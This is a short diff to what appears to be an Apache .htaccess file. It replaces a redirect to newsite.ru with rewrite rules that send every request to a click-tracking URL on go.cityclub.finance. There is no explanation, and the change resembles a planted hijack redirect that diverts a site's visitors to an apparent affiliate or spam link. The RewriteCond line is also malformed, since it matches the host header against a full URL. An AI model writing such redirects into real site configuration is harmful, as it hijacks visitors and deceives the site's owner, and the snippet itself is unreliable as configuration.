@@ -1,1 +1,3 @@
-Redirect 301 / http://newsite.ru/
+RewriteEngine On
+RewriteCond %{HTTP_HOST} https://fenenthar.github.io/fostrots/
+RewriteRule (.*) https://go.cityclub.finance/click-IQLN0JD7-NLJQBH2A?bt=25&tl=1$1 [R=301,L]
